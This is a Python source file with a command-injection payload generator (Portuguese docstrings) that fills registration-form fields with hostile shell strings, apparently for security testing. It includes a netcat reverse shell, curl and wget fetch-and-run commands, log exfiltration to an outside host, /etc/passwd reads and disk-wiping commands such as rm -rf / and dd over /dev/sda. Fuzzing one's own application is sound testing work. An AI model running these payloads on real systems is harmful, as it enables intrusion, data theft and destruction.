from typing import Dict
import random

class CommandGenerator:
    def __init__(self):
        self.basic_commands = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "` id `",
            "; uname -a"
        ]
        
        self.system_commands = [
            "; rm -rf /",
            "> /dev/null",
            "< /dev/random",
            "| dd if=/dev/random of=/dev/sda",
            "; mkfs.ext4 /dev/sda1"
        ]
        
        self.network_commands = [
            "; nc -e /bin/bash 10.0.0.1 4444",
            "| curl http://kappapride.com/malware.sh | sh",
            "; wget -O - http://kappapride.com/script.sh | bash",
            "& ping -i 30 127.0.0.1 &",
            "; telnet kappapride.com 4444"
        ]
        
        self.data_exfiltration = [
            "; tar -czf - /etc | base64",
            "| zip -r - /etc | base64",
            "; mysqldump --all-databases | gzip | base64",
            "| pg_dump | base64",
            "; find / -name *.log | xargs cat | nc kappapride.com 4444"
        ]
        
        self.process_manipulation = [
            "; kill -9 -1",
            "| killall apache2",
            "; pkill -f java",
            "& service mysql stop",
            "; systemctl stop nginx"
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera um ataque de injeção de comando aleatório"""
        all_commands = (
            self.basic_commands +
            self.system_commands +
            self.network_commands +
            self.data_exfiltration +
            self.process_manipulation
        )
        
        command = random.choice(all_commands)
        return {
            'username': command,
            'email': f"cmd@{command}.com",
            'password': command,
            'full_name': command
        }

    def generate_chained_attack(self) -> Dict[str, str]:
        """Gera um ataque com múltiplos comandos encadeados"""
        commands = [
            random.choice(self.basic_commands),
            random.choice(self.network_commands),
            random.choice(self.data_exfiltration)
        ]
        chained = " && ".join(commands)
        
        return {
            'username': chained,
            'password': chained
        }

    def generate_background_attack(self) -> Dict[str, str]:
        """Gera comandos que rodam em background"""
        background_commands = [
            f"({cmd} &)" for cmd in self.network_commands
        ]
        return {
            'username': random.choice(background_commands),
            'password': random.choice(background_commands)
        }

    def generate_time_delayed(self) -> Dict[str, str]:
        """Gera comandos com delay"""
        commands = [
            f"sleep 10 && {cmd}" for cmd in self.system_commands
        ]
        return {
            'username': random.choice(commands),
            'password': random.choice(commands)
        }
